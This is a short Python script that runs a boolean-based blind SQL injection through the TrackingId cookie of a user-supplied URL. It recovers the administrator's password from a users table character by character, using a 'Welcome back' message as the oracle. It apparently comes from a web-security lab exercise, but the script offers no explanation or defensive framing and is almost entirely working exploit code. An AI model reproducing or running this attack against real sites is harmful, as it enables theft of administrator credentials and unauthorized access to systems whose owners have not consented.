import requests

user_url = input("please enter the URL example https://google.com: ")
user_url = user_url.strip()
print(user_url)

try:
    response = requests.get(user_url)
    if response.status_code == 200:
        print(f"user input url is {user_url}")
    else:
        print(f"failed to fetch the url {response.status_code}")

except requests.exceptions.RequestException as e:
    print(f"An error occurred. Make sure you entered a valid URL (including http:// or https://).\nError: {e}")



# Extracting the Headers

session = response.cookies.get("session")
tracking_id = response.cookies.get("TrackingId")
characters = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

print(f"Session: {session}")
print(f"TrackingId: {tracking_id}")

for position in range(1, 21):
    for char in characters:
        payload = f"{tracking_id}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}"
        cookies = {
            "TrackingId": payload,
            "session": session
        }
        response = requests.get(user_url, cookies=cookies)
        if "Welcome back" in response.text:
            password += char
            print(f"Position {position}: {char} → password so far: {password}")
            break

print(f"\nFull password: {password}")

